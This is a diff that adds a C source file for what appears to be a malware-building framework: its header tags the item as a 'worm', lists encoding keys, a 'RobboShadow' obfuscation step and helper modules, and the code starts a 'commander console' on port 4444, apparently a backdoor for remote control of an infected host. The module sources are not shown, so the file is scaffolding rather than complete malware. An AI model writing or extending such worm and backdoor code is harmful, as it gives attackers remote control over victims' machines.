@@ -1,0 +1,55 @@
+#!name##DrMario
+#!devItem##True
+#!itemType##worm
+#!info##Test new module system Robbo
+#!lang##c
+#!wormCompiler##Basic-C
+#!Wprocess##BasicProc
+#!inFile##Robbo2Base_C##robbo2_base.c
+#!inFile##Robbo2Base_H##robbo2_base.h
+#!inFile##Robbo2Locust_C##robbo2_locust.c
+#!inFile##Robbo2Locust_H##robbo2_locust.h
+#!inFile##Robbo2TCP_C##robbo2_tcp.c
+#!inFile##Robbo2TCP_H##robbo2_tcp.h
+#!inFile##Robbo2##robbo2.h
+#!inFile##DrMarioHelp_C##drMario_help.c
+#!inFile##DrMarioHelp_H##drMario_help.h
+#!inFile##DrMarioBase_C##drMario_base.c
+#!inFile##DrMarioBase_H##drMario_base.h
+#!inFile##DrMarioCmd_C##drMario_cmd.c
+#!inFile##DrMarioCmd_H##drMario_cmd.h
+#!Var##DRM_IP##$IP_ADDR##Host ip address.##str
+####!Var##robbo_key##abcd##Encode key##str
+####!Var##robbo_power##34##Encode power key##str
+####!preRT##_ROBBO##RobboShadow##robbo_key##robbo_power
+#!reqMod##ChipAndDale
+
+#include "drMario_cmd.h"
+#include <stdio.h>
+
+#include <dirent.h>
+
+void HelloWorld(void) {
+    robbo_initialize();
+    robbo_locust_initialize();
+    rtcp_initialize();
+    pDR_MARIO_COMMANDER_CONSOLE mario1 = drMario_build_commander(0, 4444);
+    mario1->start(mario1);
+    robbo_wapi_WaitForSingleObject(mario1->cmd_handle, INFINITE);
+    mario1->stop(mario1);
+}
+
+int main(void) {
+    printf("[drMario] Start.......\n");
+    //robbo_initialize();
+    //robbo_locust_initialize();
+    //rtcp_initialize();
+
+    //pDR_MARIO_COMMANDER_CONSOLE mario1 = drMario_build_commander(0, 4444);
+    //mario1->start(mario1);
+    //robbo_wapi_WaitForSingleObject(mario1->cmd_handle, INFINITE);
+    //mario1->stop(mario1);
+
+    //printf("[drMario] Stop program.\n");
+}
+
